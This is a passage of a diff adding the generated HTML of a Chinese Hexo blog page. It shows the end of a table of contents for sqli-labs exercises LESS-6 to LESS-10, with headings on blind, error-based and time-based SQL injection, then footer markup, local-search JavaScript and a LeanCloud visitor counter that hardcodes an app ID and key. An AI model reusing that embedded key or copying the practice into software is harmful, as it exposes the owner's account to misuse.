class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、盲注四连"><span class="nav-number">8.1.</span> <span class="nav-text"><a href="#1&#x3001;&#x76F2;&#x6CE8;&#x56DB;&#x8FDE;" class="headerlink" title="1&#x3001;&#x76F2;&#x6CE8;&#x56DB;&#x8FDE;"></a>1&#x3001;&#x76F2;&#x6CE8;&#x56DB;&#x8FDE;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、利用-left-函数得到数据库名"><span class="nav-number">8.1.1.</span> <span class="nav-text"><a href="#1&#x3001;&#x5229;&#x7528;-left-&#x51FD;&#x6570;&#x5F97;&#x5230;&#x6570;&#x636E;&#x5E93;&#x540D;" class="headerlink" title="1&#x3001;&#x5229;&#x7528; left() &#x51FD;&#x6570;&#x5F97;&#x5230;&#x6570;&#x636E;&#x5E93;&#x540D;"></a><strong>1&#x3001;&#x5229;&#x7528; <em>left()</em> &#x51FD;&#x6570;&#x5F97;&#x5230;&#x6570;&#x636E;&#x5E93;&#x540D;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、利用-substr-ascii-函数得到表名"><span class="nav-number">8.1.2.</span> <span class="nav-text"><a href="#2&#x3001;&#x5229;&#x7528;-substr-ascii-&#x51FD;&#x6570;&#x5F97;&#x5230;&#x8868;&#x540D;" class="headerlink" title="2&#x3001;&#x5229;&#x7528; substr() , ascii() &#x51FD;&#x6570;&#x5F97;&#x5230;&#x8868;&#x540D;"></a><strong>2&#x3001;&#x5229;&#x7528; <em>substr()</em> , <em>ascii()</em> &#x51FD;&#x6570;&#x5F97;&#x5230;&#x8868;&#x540D;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、利用-regexp-函数得到列名"><span class="nav-number">8.1.3.</span> <span class="nav-text"><a href="#3&#x3001;&#x5229;&#x7528;-regexp-&#x51FD;&#x6570;&#x5F97;&#x5230;&#x5217;&#x540D;" class="headerlink" title="3&#x3001;&#x5229;&#x7528; regexp() &#x51FD;&#x6570;&#x5F97;&#x5230;&#x5217;&#x540D;"></a><strong>3&#x3001;&#x5229;&#x7528; <em>regexp()</em> &#x51FD;&#x6570;&#x5F97;&#x5230;&#x5217;&#x540D;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、利用-ord-和-mid-函数得到user表中的内容"><span class="nav-number">8.1.4.</span> <span class="nav-text"><a href="#4&#x3001;&#x5229;&#x7528;-ord-&#x548C;-mid-&#x51FD;&#x6570;&#x5F97;&#x5230;user&#x8868;&#x4E2D;&#x7684;&#x5185;&#x5BB9;" class="headerlink" title="4&#x3001;&#x5229;&#x7528; ord() &#x548C; mid() &#x51FD;&#x6570;&#x5F97;&#x5230;user&#x8868;&#x4E2D;&#x7684;&#x5185;&#x5BB9;"></a><strong>4&#x3001;&#x5229;&#x7528; <em>ord()</em> &#x548C; <em>mid()</em> &#x51FD;&#x6570;&#x5F97;&#x5230;user&#x8868;&#x4E2D;&#x7684;&#x5185;&#x5BB9;</strong></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、报错注入"><span class="nav-number">8.2.</span> <span class="nav-text"><a href="#2&#x3001;&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="headerlink" title="2&#x3001;&#x62A5;&#x9519;&#x6CE8;&#x5165;"></a>2&#x3001;&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、-concat-计数报错"><span class="nav-number">8.2.1.</span> <span class="nav-text"><a href="#1&#x3001;-concat-&#x8BA1;&#x6570;&#x62A5;&#x9519;" class="headerlink" title="1&#x3001; concat() &#x8BA1;&#x6570;&#x62A5;&#x9519;"></a>1&#x3001; <em>concat()</em> &#x8BA1;&#x6570;&#x62A5;&#x9519;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-基于double类型溢出进行报错"><span class="nav-number">8.2.2.</span> <span class="nav-text"><a href="#2&#x3001;-&#x57FA;&#x4E8E;double&#x7C7B;&#x578B;&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;" class="headerlink" title="2&#x3001; &#x57FA;&#x4E8E;double&#x7C7B;&#x578B;&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;"></a>2&#x3001; &#x57FA;&#x4E8E;double&#x7C7B;&#x578B;&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、-使用bigint溢出进行报错"><span class="nav-number">8.2.3.</span> <span class="nav-text"><a href="#3&#x3001;-&#x4F7F;&#x7528;bigint&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;" class="headerlink" title="3&#x3001; &#x4F7F;&#x7528;bigint&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;"></a>3&#x3001; &#x4F7F;&#x7528;bigint&#x6EA2;&#x51FA;&#x8FDB;&#x884C;&#x62A5;&#x9519;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、xpath函数报错注入"><span class="nav-number">8.2.4.</span> <span class="nav-text"><a href="#4&#x3001;xpath&#x51FD;&#x6570;&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="headerlink" title="4&#x3001;xpath&#x51FD;&#x6570;&#x62A5;&#x9519;&#x6CE8;&#x5165;"></a>4&#x3001;xpath&#x51FD;&#x6570;&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、-利用数据的重复性"><span class="nav-number">8.2.5.</span> <span class="nav-text"><a href="#5&#x3001;-&#x5229;&#x7528;&#x6570;&#x636E;&#x7684;&#x91CD;&#x590D;&#x6027;" class="headerlink" title="5&#x3001; &#x5229;&#x7528;&#x6570;&#x636E;&#x7684;&#x91CD;&#x590D;&#x6027;"></a>5&#x3001; &#x5229;&#x7528;&#x6570;&#x636E;&#x7684;&#x91CD;&#x590D;&#x6027;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、延时注入"><span class="nav-number">8.3.</span> <span class="nav-text"><a href="#3&#x3001;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;" class="headerlink" title="3&#x3001;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;"></a>3&#x3001;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、利用-sleep-函数进行注入"><span class="nav-number">8.3.1.</span> <span class="nav-text"><a href="#1&#x3001;&#x5229;&#x7528;-sleep-&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6CE8;&#x5165;" class="headerlink" title="1&#x3001;&#x5229;&#x7528; sleep() &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6CE8;&#x5165;"></a>1&#x3001;&#x5229;&#x7528; <em>sleep()</em> &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6CE8;&#x5165;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、利用-benchmark-进行延时注入"><span class="nav-number">8.3.2.</span> <span class="nav-text"><a href="#2&#x3001;&#x5229;&#x7528;-benchmark-&#x8FDB;&#x884C;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;" class="headerlink" title="2&#x3001;&#x5229;&#x7528; benchmark() &#x8FDB;&#x884C;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;"></a>2&#x3001;&#x5229;&#x7528; <em>benchmark()</em> &#x8FDB;&#x884C;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-6"><span class="nav-number">9.</span> <span class="nav-text"><a href="#LESS-6" class="headerlink" title="LESS-6"></a>LESS-6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#导入导出相关操作"><span class="nav-number">10.</span> <span class="nav-text"><a href="#&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#x76F8;&#x5173;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#x76F8;&#x5173;&#x64CD;&#x4F5C;"></a>&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#x76F8;&#x5173;&#x64CD;&#x4F5C;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#load-file"><span class="nav-number">10.1.</span> <span class="nav-text"><a href="#load-file" class="headerlink" title="load_file()"></a><strong><font face="&#x96B6;&#x4E66;">load_file()</font></strong></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#load-data-file导入数据库"><span class="nav-number">10.2.</span> <span class="nav-text"><a href="#load-data-file&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="load data file&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;"></a><strong><font face="&#x96B6;&#x4E66;">load data file&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;</font></strong></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#导入到文件中"><span class="nav-number">10.3.</span> <span class="nav-text"><a href="#&#x5BFC;&#x5165;&#x5230;&#x6587;&#x4EF6;&#x4E2D;" class="headerlink" title="&#x5BFC;&#x5165;&#x5230;&#x6587;&#x4EF6;&#x4E2D;"></a><strong>&#x5BFC;&#x5165;&#x5230;&#x6587;&#x4EF6;&#x4E2D;</strong></span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-7"><span class="nav-number">11.</span> <span class="nav-text"><a href="#LESS-7" class="headerlink" title="LESS-7"></a>LESS-7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-8"><span class="nav-number">12.</span> <span class="nav-text"><a href="#LESS-8" class="headerlink" title="LESS-8"></a>LESS-8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-9"><span class="nav-number">13.</span> <span class="nav-text"><a href="#LESS-9" class="headerlink" title="LESS-9"></a>LESS-9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-10"><span class="nav-number">14.</span> <span class="nav-text"><a href="#LESS-10" class="headerlink" title="LESS-10"></a>LESS-10</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">新城瑞雪</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log(`Failed to save Visitor num, with error message: ${responseJSON.error}`);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log(`LeanCloud Counter Error: ${responseJSON.code} ${responseJSON.error}`);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz',
+                'X-LC-Key': 'FKDjLVri4dF3W2GHPq9mP2WR',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
